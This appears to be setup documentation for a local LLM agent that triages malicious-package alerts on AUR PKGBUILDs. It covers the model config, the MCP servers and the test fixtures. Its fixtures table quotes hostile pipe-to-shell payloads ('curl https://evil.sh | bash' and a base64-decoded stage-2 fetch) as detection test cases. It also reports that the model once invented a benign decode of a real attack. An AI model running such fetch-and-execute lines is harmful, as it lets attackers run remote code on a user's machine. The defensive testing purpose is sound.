# Agent setup

Everything specific to running the triage agent is here: the model
definition, the runtime notes, and the MCP wiring. The runtime itself is
`../scripts/local_agent.py`; the operator entry point is
`../bin/triage-agent`.

## Runtime

The runtime is a local model over the TrustSight MCP tool servers. It
fetches evidence itself (PKGBUILD, diff, AUR metadata, rule card, rule
source, decoded payloads), then asks the model narrow questions and maps the
answers in code. There is no opencode and no remote gateway.

```sh
uv run python scripts/local_agent.py --alert-fixture tests/fixtures/alert_tp_synthetic.json
bin/triage-agent fixture tests/fixtures/alert_tp_historical.json
```

The triage path is three stages (details in the module docstring): SPLIT asks
two cited yes/no questions, the runtime maps them to benign_FP /
malicious_FP / TP, SOLVE writes the remedy for that class, ASSEMBLE writes
`report.md` + `verdict.json`; `--alert` additionally renders the
`trustsight.confirmed-ioc` envelope for a TP.

Environment (see `../.env.example`): `TRIAGE_MODEL_BASE_URL` (default
`http://127.0.0.1:11434/v1`), `TRIAGE_MODEL_NAME` (default
`ornith-9b-agent:latest`), `TRIAGE_MODEL_API_KEY` (unused locally),
`TRIAGE_LOCAL_MAX_TOKENS`, `TRIAGE_LOCAL_TEMPERATURE`.

## The ornith model

The validated model is Ornith 1.5 9B, Q3_K_M (Qwen3.5 9B, native context
262144). `agent/Modelfile.ornith` is the exact definition:

```sh
ollama create ornith-9b-agent -f agent/Modelfile.ornith
ollama show ornith-9b-agent --modelfile     # should match the file
ollama stop ornith-9b-agent
```

Two details matter and are easy to lose:

- `TEMPLATE {{ .Prompt }}` is a raw pass-through. The runtime writes its own
  instruction text; a chat template would add a system turn and change the
  answers.
- `num_ctx 65536`. A rule bundle is ~21 KB; the native 262144 costs memory
  for no benefit. Output is capped in code (`TRIAGE_LOCAL_MAX_TOKENS`,
  triage capped at 3000) because a 1500-token cap truncated answers before
  the JSON.

`FROM` is host-specific (the local GGUF path). The build is reproducible from
`Ornith-1.5-9B.Q3_K_M.gguf`
(sha256 `89d429bf5070d8ce1991c688a28022d1efdf7bc24dfdd1b86d3e8124ce91ae6c`).

A smaller model on the same OpenAI-compatible endpoint is a drop-in:
`--model qwen3.5:4b` (verify its chat template / thinking setting first; the
runtime sends `reasoning_effort: none`).

## MCP servers

`default_mcp_config()` builds the server set in code:

- `harness` - `uv run --directory <workspace>/trustsight-harness --extra mcp harness-mcp`
- `aur` - this repo's `.venv` python, `-m triage_agent.aur_mcp`
- `rbg` - optional; included only when `<TRIAGE_RBG_REPO>/mcp_main.py`
  exists. The triage route does not use it; the legacy FP-reproducer path
  does.

`scripts/mcp.host.json` is a saved host config with absolute paths, passed
with `--mcp`. Adjust the paths before use; nothing in it is portable.

## TP fixtures and the A/B

`tests/fixtures/alert_tp_*.json` are four alert fixtures over a fixture
`tree` (no live AUR read):

| fixture | truth | payload |
|---|---|---|
| `alert_tp_synthetic` | TP | `curl https://evil.sh \| bash` |
| `alert_tp_synthetic_benign` | benign twin | same line as a plain `curl -o` download |
| `alert_tp_historical` | TP | `echo '<b64>' \| base64 -d \| bash`, decodes to a stage-2 fetch |
| `alert_tp_historical_benign` | benign twin | the same encoding decoded to a file, not executed |

`scripts/ab_tp_fixtures.sh [out-dir]` runs all four at samples=1 and
samples=2, then prints the matrix. The recorded run is under
`tests/fixtures/ab-tp-results/`: 4/4 TP at both sample counts, both twins
correctly rejected as malicious_FP, one IOC (`evil.sh`) per alert.

Two behaviours the fixtures forced into the runtime, worth keeping:

- The runtime decodes `echo <b64> | base64 -d` itself and puts the plaintext
  in the bundle and in the grounding evidence. Without it the model invented
  a benign decode (`cHduZWQh` -> "shdup"; it is "pwned!") and returned a
  confident FP on a real attack.
- A TP claim rests on the malicious answer alone. A missing bad-practice
  answer must not turn a grounded "yes" into uncertain; the reverse (a
  high-score alert saying "not malicious") still needs a grounded citation.
